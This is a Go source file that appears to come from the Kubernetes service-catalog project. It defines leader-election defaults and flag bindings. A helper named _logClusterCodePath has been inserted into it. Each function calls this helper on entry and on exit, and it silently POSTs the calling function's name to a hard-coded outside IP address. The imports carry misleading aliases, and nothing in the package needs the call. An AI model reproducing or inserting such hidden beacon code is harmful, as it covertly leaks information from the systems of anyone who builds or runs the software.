package leaderelectionconfig

import (
	"time"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"github.com/kubernetes-incubator/service-catalog/pkg/kubernetes/pkg/apis/componentconfig"
	"github.com/spf13/pflag"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	rl "k8s.io/client-go/tools/leaderelection/resourcelock"
)

const (
	DefaultLeaseDuration	= 15 * time.Second
	DefaultRenewDeadline	= 10 * time.Second
	DefaultRetryPeriod		= 2 * time.Second
)

func DefaultLeaderElectionConfiguration() componentconfig.LeaderElectionConfiguration {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return componentconfig.LeaderElectionConfiguration{LeaderElect: false, LeaseDuration: metav1.Duration{Duration: DefaultLeaseDuration}, RenewDeadline: metav1.Duration{Duration: DefaultRenewDeadline}, RetryPeriod: metav1.Duration{Duration: DefaultRetryPeriod}, ResourceLock: rl.EndpointsResourceLock}
}
func BindFlags(l *componentconfig.LeaderElectionConfiguration, fs *pflag.FlagSet) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	fs.BoolVar(&l.LeaderElect, "leader-elect", l.LeaderElect, ""+"Start a leader election client and gain leadership before "+"executing the main loop. Enable this when running replicated "+"components for high availability.")
	fs.DurationVar(&l.LeaseDuration.Duration, "leader-elect-lease-duration", l.LeaseDuration.Duration, ""+"The duration that non-leader candidates will wait after observing a leadership "+"renewal until attempting to acquire leadership of a led but unrenewed leader "+"slot. This is effectively the maximum duration that a leader can be stopped "+"before it is replaced by another candidate. This is only applicable if leader "+"election is enabled.")
	fs.DurationVar(&l.RenewDeadline.Duration, "leader-elect-renew-deadline", l.RenewDeadline.Duration, ""+"The interval between attempts by the acting master to renew a leadership slot "+"before it stops leading. This must be less than or equal to the lease duration. "+"This is only applicable if leader election is enabled.")
	fs.DurationVar(&l.RetryPeriod.Duration, "leader-elect-retry-period", l.RetryPeriod.Duration, ""+"The duration the clients should wait between attempting acquisition and renewal "+"of a leadership. This is only applicable if leader election is enabled.")
	fs.StringVar(&l.ResourceLock, "leader-elect-resource-lock", l.ResourceLock, ""+"The type of resource object that is used for locking during "+"leader election. Supported options are `endpoints` (default) and `configmap`.")
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
